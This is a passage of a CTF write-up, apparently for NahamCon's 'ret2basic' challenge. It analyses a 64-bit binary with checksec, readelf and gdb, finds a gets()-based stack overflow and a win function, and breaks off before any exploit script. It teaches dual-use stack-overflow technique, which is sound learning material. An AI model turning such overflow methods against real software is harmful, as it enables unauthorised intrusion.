I"äğ<blockquote>
  <p>ret2basic was a basic ret2win based binary exploitation challenge where we Locate a method within the binary that we want to call and do so by overwriting a saved return address on the stack.</p>
</blockquote>

<h2 id="binary-analysis">Binary Analysis</h2>

<p>Taking a peek at the file:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ file ret2basic
ret2basic: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>3ca85eae693fed659275c0eed9c313e7f0083b85, <span class="k">for </span>GNU/Linux 4.4.0, not stripped
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Binary is an 64-bit ELF executable and is not stripped which means we can decompile it with ghidra/cutter and take a look at the code.</p>

<p>Now letâ€™s look at the security features of the binary:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ checksec ret2basic
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/nahamcon/binary/ret2basic'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<ul>
  <li>
    <p>No Stack canary : Stack Canaries are a secret value placed on the stack which changes every time the program is started. Refer <a href="https://ctf101.org/binary-exploitation/stack-canaries/"><strong>this</strong></a> to learn more about stack canaries.</p>
  </li>
  <li>
    <p>No PIE : It means ASLR is disabled and the binary will be loaded at fixed base address (i.e. 0x400000)</p>
  </li>
</ul>

<p>Lucky for us, it appears this is an basic Stack based Buffer Overflow with ASLR disabled.</p>

<p>Now rather than jumping to Ghidra to decompile the binary, letâ€™s try to analyse it manually and find the vulnerable function and itâ€™s offset.</p>

<h3 id="segmentation-fault">Segmentation fault</h3>

<p>Testing the binary:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ ./ret2basic
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAA
Nope :<span class="o">(</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using python3 to generate long string:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ python3 <span class="nt">-c</span> <span class="s2">"print('A'*200)"</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Sending the string to binary:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ ./ret2basic
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
</pre></td></tr></tbody></table></code></pre></div></div>

<p>On sending 200 Aâ€™s we receive segmentation fault which indicates somewhere we overwrote a address which supposedly caused the binary to crash.</p>

<h3 id="functions">Functions</h3>

<p>Next We take a look at the functions inside this binary, weâ€™ll make use of <code class="language-plaintext highlighter-rouge">readelf</code> to dump all the functions:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary
â†’ readelf <span class="nt">-s</span> ret2basic | <span class="nb">grep</span> <span class="s2">"FUNC"</span>
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ftell@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="o">[</span>...]@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseek@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">exit</span>@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     6: 0000000000401140     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
     7: 0000000000401170     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
     8: 00000000004011b0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
    11: 00000000004011e0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    22: 00000000004013d0     5 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    23: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5
    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5
    28: 000000000040130f    45 FUNC    GLOBAL DEFAULT   14 vuln
    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.2.5
    32: 00000000004013d8     0 FUNC    GLOBAL HIDDEN    15 _fini
    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5
    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">printf</span>@GLIBC_2.2.5
    35: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND rewind@GLIBC_2.2.5
    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.2.5
    39: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ftell@GLIBC_2.2.5
    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5
    44: 0000000000401360   101 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5
    46: 0000000000401215   250 FUNC    GLOBAL DEFAULT   14 win
    48: 0000000000401130     5 FUNC    GLOBAL HIDDEN    14 _dl_relocate_sta[...]
    49: 0000000000401100    47 FUNC    GLOBAL DEFAULT   14 _start
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseek@GLIBC_2.2.5
    52: 000000000040133c    33 FUNC    GLOBAL DEFAULT   14 main
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.2.5
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">exit</span>@GLIBC_2.2.5
    57: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
    58: 00000000004011e6    47 FUNC    GLOBAL DEFAULT   14 setup
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We see three interesting functions:</p>

<ul>
  <li>main</li>
  <li>vuln</li>
  <li>win</li>
</ul>

<p>Function <code class="language-plaintext highlighter-rouge">win</code> being present pretty much hints toward this challenge being <code class="language-plaintext highlighter-rouge">ret2win</code></p>

<h2 id="debugging">Debugging</h2>

<p>Letâ€™s move forward with debugging the binary, weâ€™ll use <a href="https://github.com/hugsy/gef"><strong>gef</strong></a> which is <code class="language-plaintext highlighter-rouge">GDB enhanced features</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/nahamcon/binary

â†’ gdb <span class="nt">-q</span> ret2basic
GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
92 commands loaded <span class="k">for </span>GDB 9.2 using Python engine 3.8
Reading symbols from ret2basic...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>ret2basic<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can also see the functions inside the binary using <code class="language-plaintext highlighter-rouge">info functions</code> command in gef :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>gefâ¤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  free@plt
0x0000000000401040  puts@plt
0x0000000000401050  fclose@plt
0x0000000000401060  setbuf@plt
0x0000000000401070  <span class="nb">printf</span>@plt
0x0000000000401080  rewind@plt
0x0000000000401090  fgets@plt
0x00000000004010a0  ftell@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  malloc@plt
0x00000000004010d0  fseek@plt
0x00000000004010e0  fopen@plt
0x00000000004010f0  <span class="nb">exit</span>@plt
0x0000000000401100  _start
0x0000000000401130  _dl_relocate_static_pie
0x0000000000401140  deregister_tm_clones
0x0000000000401170  register_tm_clones
0x00000000004011b0  __do_global_dtors_aux
0x00000000004011e0  frame_dummy
0x00000000004011e6  setup
0x0000000000401215  win
0x000000000040130f  vuln
0x000000000040133c  main
0x0000000000401360  __libc_csu_init
0x00000000004013d0  __libc_csu_fini
0x00000000004013d8  _fini
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Next we disassemble <code class="language-plaintext highlighter-rouge">main</code> function:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>gefâ¤  disassemble main
Dump of assembler code <span class="k">for function </span>main:
   0x000000000040133c &lt;+0&gt;:     push   rbp
   0x000000000040133d &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000401340 &lt;+4&gt;:     mov    eax,0x0
   0x0000000000401345 &lt;+9&gt;:     call   0x40130f &lt;vuln&gt;
   0x000000000040134a &lt;+14&gt;:    lea    rdi,[rip+0xd22]        <span class="c"># 0x402073</span>
   0x0000000000401351 &lt;+21&gt;:    call   0x401040 &lt;puts@plt&gt;
   0x0000000000401356 &lt;+26&gt;:    mov    eax,0x0
   0x000000000040135b &lt;+31&gt;:    pop    rbp
   0x000000000040135c &lt;+32&gt;:    ret
End of assembler dump.
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Here we see <code class="language-plaintext highlighter-rouge">main</code> function calling <code class="language-plaintext highlighter-rouge">vuln</code> function which is probably where the vulnerability is present.</p>

<p>Letâ€™s look at vuln and make sure of it:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>gefâ¤  disassemble vuln
Dump of assembler code <span class="k">for function </span>vuln:
   0x000000000040130f &lt;+0&gt;:     push   rbp
   0x0000000000401310 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000401313 &lt;+4&gt;:     sub    rsp,0x70
   0x0000000000401317 &lt;+8&gt;:     lea    rdi,[rip+0xd3c]        <span class="c"># 0x40205a</span>
   0x000000000040131e &lt;+15&gt;:    mov    eax,0x0
   0x0000000000401323 &lt;+20&gt;:    call   0x401070 &lt;<span class="nb">printf</span>@plt&gt;
   0x0000000000401328 &lt;+25&gt;:    lea    rax,[rbp-0x70]
   0x000000000040132c &lt;+29&gt;:    mov    rdi,rax
   0x000000000040132f &lt;+32&gt;:    mov    eax,0x0
   0x0000000000401334 &lt;+37&gt;:    call   0x4010b0 &lt;gets@plt&gt;
   0x0000000000401339 &lt;+42&gt;:    nop
   0x000000000040133a &lt;+43&gt;:    leave
   0x000000000040133b &lt;+44&gt;:    ret
End of assembler dump.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Bingo ! Here we see <code class="language-plaintext highlighter-rouge">vuln</code> is using <code class="language-plaintext highlighter-rouge">gets()</code> which is where the overflow is existing.</p>

<p>On reading about <code class="language-plaintext highlighter-rouge">gets()</code> using <code class="language-plaintext highlighter-rouge">man gets</code></p>

<blockquote>
  <p>Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead</p>
</blockquote>

<p>So now at least we are clear we need to clobber up <code class="language-plaintext highlighter-rouge">vuln</code> for conducting overflow.</p>

<p>Further there is one more function <code class="language-plaintext highlighter-rouge">win</code> left to analyse, weâ€™ll use <a href="https://github.com/rizinorg/cutter"><strong>cutter</strong></a> a reverse engineering tool. We can also use tools like radare, binary ninja .</p>

<ul>
  <li>Step 1: Open the binary in Cutter and analyse it, once done we should see a functions tab on left side. On selecting <code class="language-plaintext highlighter-rouge">main</code> function we should see the following graphical view where itâ€™s calling <code class="language-plaintext highlighter-rouge">vuln</code> function:</li>
</ul>

<p><img src="/assets/img/Posts/ret2basic/main.png" alt="main" /></p>

<p>Looking at functions tab we also see that first we need to reach vuln function and then win</p>

<ul>
  <li>Step 2: Looking at <code class="language-plaintext highlighter-rouge">vuln</code> function</li>
</ul>

<p>Here we see <code class="language-plaintext highlighter-rouge">Can you overflow this?</code> string and the <code class="language-plaintext highlighter-rouge">gets()</code> call.</p>

<p><img src="/assets/img/Posts/ret2basic/vuln.png" alt="vuln" /></p>

<ul>
  <li>Step 3: Peeking at <code class="language-plaintext highlighter-rouge">win</code> function</li>
</ul>

<p>Here we understand <code class="language-plaintext highlighter-rouge">win</code> function will allow us to read the <code class="language-plaintext highlighter-rouge">flag.txt</code> once we are able to reach it.</p>

<p><img src="/assets/img/Posts/ret2basic/win.png" alt="win" /></p>

<h3 id="overflow-where">Overflow? Where?</h3>

<p>Great ! So now know what needs to be done ? -&gt; we need to reach <code class="language-plaintext highlighter-rouge">win</code> function to read <code class="language-plaintext highlighter-rouge">flag.txt</code></p>

<p>Next, we need to figure out how it needs to be done.</p>

<p>Letâ€™s first send 200 Aâ€™s to the binary and analyse the registers:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
</pre></td><td class="rouge-code"><pre>gefâ¤  r
Starting program: /root/Documents/nahamcon/binary/ret2basic
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x7fffffffdcf0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;)</span>
RBX: 0x0
RCX: 0x7ffff7f9e980 <span class="nt">--</span><span class="o">&gt;</span> 0xfbad208b
RDX: 0x0
RSI: 0x7ffff7f9ea03 <span class="nt">--</span><span class="o">&gt;</span> 0xfa1680000000000a
RDI: 0x7ffff7fa1680 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x4141414141414141 <span class="o">(</span><span class="s1">'AAAAAAAA'</span><span class="o">)</span>
RSP: 0x7fffffffdd68 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 80 <span class="nb">times</span><span class="o">&gt;)</span>
RIP: 0x40133b <span class="o">(</span>&lt;vuln+44&gt;:       ret<span class="o">)</span>
R8 : 0x7fffffffdcf0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 200 <span class="nb">times</span><span class="o">&gt;)</span>
R9 : 0x0
R10: 0xfffffffffffff24a
R11: 0x246
R12: 0x401100 <span class="o">(</span>&lt;_start&gt;:        endbr64<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x401334 &lt;vuln+37&gt;:  call   0x4010b0 &lt;gets@plt&gt;
   0x401339 &lt;vuln+42&gt;:  nop
   0x40133a &lt;vuln+43&gt;:  leave
<span class="o">=&gt;</span> 0x40133b &lt;vuln+44&gt;:  ret
   0x40133c &lt;main&gt;:     push   rbp
   0x40133d &lt;main+1&gt;:   mov    rbp,rsp
   0x401340 &lt;main+4&gt;:   mov    eax,0x0
   0x401345 &lt;main+9&gt;:   call   0x40130f &lt;vuln&gt;
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffdd68 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 80 <span class="nb">times</span><span class="o">&gt;)</span>
0008| 0x7fffffffdd70 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 72 <span class="nb">times</span><span class="o">&gt;)</span>
0016| 0x7fffffffdd78 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 64 <span class="nb">times</span><span class="o">&gt;)</span>
0024| 0x7fffffffdd80 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 56 <span class="nb">times</span><span class="o">&gt;)</span>
0032| 0x7fffffffdd88 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 48 <span class="nb">times</span><span class="o">&gt;)</span>
0040| 0x7fffffffdd90 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 40 <span class="nb">times</span><span class="o">&gt;)</span>
0048| 0x7fffffffdd98 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 32 <span class="nb">times</span><span class="o">&gt;)</span>
0056| 0x7fffffffdda0 <span class="o">(</span><span class="s1">'A'</span> &lt;repeats 24 <span class="nb">times</span><span class="o">&gt;)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040133b <span class="k">in </span>vuln <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
<span class="nv">$rax</span>   : 0x00007fffffffdcf0  â†’  <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
<span class="nv">$rbx</span>   : 0x0
<span class="nv">$rcx</span>   : 0x00007ffff7f9e980  â†’  0x00000000fbad208b
<span class="nv">$rdx</span>   : 0x0
<span class="nv">$rsp</span>   : 0x00007fffffffdd68  â†’  <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
<span class="nv">$rbp</span>   : 0x4141414141414141 <span class="o">(</span><span class="s2">"AAAAAAAA"</span>?<span class="o">)</span>
<span class="nv">$rsi</span>   : 0x00007ffff7f9ea03  â†’  0xfa1680000000000a
<span class="nv">$rdi</span>   : 0x00007ffff7fa1680  â†’  0x0000000000000000
<span class="nv">$rip</span>   : 0x000000000040133b  â†’  &lt;vuln+44&gt; ret
<span class="nv">$r8</span>    : 0x00007fffffffdcf0  â†’  <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
<span class="nv">$r9</span>    : 0x0
<span class="nv">$r10</span>   : 0xfffffffffffff24a
<span class="nv">$r11</span>   : 0x246
<span class="nv">$r12</span>   : 0x0000000000401100  â†’  &lt;_start+0&gt; endbr64
<span class="nv">$r13</span>   : 0x0
<span class="nv">$r14</span>   : 0x0
<span class="nv">$r15</span>   : 0x0
<span class="nv">$eflags</span>: <span class="o">[</span>zero carry parity adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007fffffffdd68â”‚+0x0000: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>    â† <span class="nv">$rsp</span>
0x00007fffffffdd70â”‚+0x0008: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
0x00007fffffffdd78â”‚+0x0010: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
0x00007fffffffdd80â”‚+0x0018: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
0x00007fffffffdd88â”‚+0x0020: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
0x00007fffffffdd90â”‚+0x0028: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
0x00007fffffffdd98â”‚+0x0030: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
0x00007fffffffdda0â”‚+0x0038: <span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAA"</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
     0x401334 &lt;vuln+37&gt;        call   0x4010b0 &lt;gets@plt&gt;
     0x401339 &lt;vuln+42&gt;        nop
     0x40133a &lt;vuln+43&gt;        leave
 â†’   0x40133b &lt;vuln+44&gt;        ret
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2basic", stopped 0x40133b in vuln (), reason: SIGSEGV</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
<span class="o">[</span><span class="c">#0] 0x40133b â†’ vuln()</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
gefâ¤
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Here we can see the overflow smashing the stack overwriting RSP and RBP to be filled with Aâ€™s, causing the <code class="language-plaintext highlighter-rouge">ret</code> from <code class="language-plaintext highlighter-rouge">vuln()</code> to crash.</p>

<p>Now some individual who previously might have seen classic stack buffer overflowâ€™s in HackTheBox or other pentesting labs might be wondering why didnâ€™t we overwrite return instruction pointer (RIP), but instead we caused <code class="language-plaintext highlighter-rouge">ret</code> from <code class="language-plaintext highlighter-rouge">vuln()</code> to crash.</p>

<p>The reason why we didnt overwrite RIP is cause this an 64-bit binary.</p>

<h2 id="brainstorm-32-bit-vs-64-bit">Brainstorm: 32-bit vs 64-bit</h2>

<p>Some important points with regards to 64-bit:</p>

<ol>
  <li>General purpose registers have been expanded to 64-bit. So we now have RAX, RBX, RCX, RDX, RSI, and RDI.</li>
  <li>Instruction pointer, base pointer, and stack pointer have also been expanded to 64-bit as RIP, RBP, and RSP respectively.</li>
  <li>Additional registers have been provided: R8 to R15.</li>
  <li>Pointers are 8-bytes wide.</li>
  <li>Push/pop on the stack are 8-bytes wide.</li>
  <li>Maximum canonical address size of 0x00007FFFFFFFFFFF.</li>
  <li>Parameters to functions are passed through registers.</li>
</ol>

<ul>
